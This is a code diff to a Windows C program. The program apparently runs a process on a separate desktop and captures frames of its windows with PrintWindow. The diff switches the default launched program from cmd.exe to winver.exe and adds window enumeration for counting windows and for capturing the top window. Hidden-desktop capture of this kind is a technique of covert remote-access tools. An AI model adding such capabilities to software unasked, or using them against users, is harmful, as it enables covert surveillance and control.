@@ -78,9 +78,10 @@ static char *on_desktop(char *(*fn)(void *), void *arg) {
 }
 
 static char *do_frame(void *arg);
+static BOOL CALLBACK count_wins(HWND hwnd, LPARAM lp);
 
 static char *do_start(void *arg) {
-    const char *exe = arg && ((const char *)arg)[0] ? (const char *)arg : "C:\\Windows\\System32\\cmd.exe";
+    const char *exe = arg && ((const char *)arg)[0] ? (const char *)arg : "C:\\Windows\\System32\\winver.exe";
     STARTUPINFOW si;
     PROCESS_INFORMATION pi;
     wchar_t desktop[32];
@@ -116,7 +117,11 @@ static char *do_start(void *arg) {
     char buf[80];
     DWORD sid = 0;
     ProcessIdToSessionId(GetCurrentProcessId(), &sid);
-    snprintf(buf, sizeof(buf), "desktop started pid=%lu session=%lu", pi.dwProcessId, sid);
+    {
+        int wins = 0;
+        EnumWindows(count_wins, (LPARAM)&wins);
+        snprintf(buf, sizeof(buf), "desktop started pid=%lu session=%lu windows=%d", pi.dwProcessId, sid, wins);
+    }
     return dupstr(buf);
 }
 
@@ -138,6 +143,20 @@ static LRESULT CALLBACK hd_wndproc(HWND hwnd, UINT msg, WPARAM wp, LPARAM lp) {
         return 0;
     }
     return DefWindowProcW(hwnd, msg, wp, lp);
+}
+
+static BOOL CALLBACK count_wins(HWND hwnd, LPARAM lp) {
+    if (IsWindowVisible(hwnd)) (*(int *)lp)++;
+    return TRUE;
+}
+
+static BOOL CALLBACK pick_top(HWND hwnd, LPARAM lp) {
+    RECT rc;
+    if (!IsWindowVisible(hwnd) || hwnd == g_view) return TRUE;
+    if (!GetWindowRect(hwnd, &rc)) return TRUE;
+    if (rc.right - rc.left < 80 || rc.bottom - rc.top < 40) return TRUE;
+    *(HWND *)lp = hwnd;
+    return FALSE;
 }
 
 static char *do_frame(void *arg) {
@@ -176,6 +195,18 @@ static char *do_frame(void *arg) {
     old = SelectObject(mem, bmp);
     if (g_view) PrintWindow(g_view, mem, 0);
     else BitBlt(mem, 0, 0, dw, dh, hdc, 0, 0, SRCCOPY);
+    {
+        HWND other = NULL;
+        EnumWindows(pick_top, (LPARAM)&other);
+        if (other && other != g_view) {
+            RECT wr;
+            if (GetWindowRect(other, &wr)) {
+                int ww = wr.right - wr.left;
+                int wh = wr.bottom - wr.top;
+                if (ww > 40 && wh > 40) PrintWindow(other, mem, 0);
+            }
+        }
+    }
     SelectObject(mem, old);
     ZeroMemory(&bi, sizeof(bi));
     bi.bmiHeader.biSize = 40;
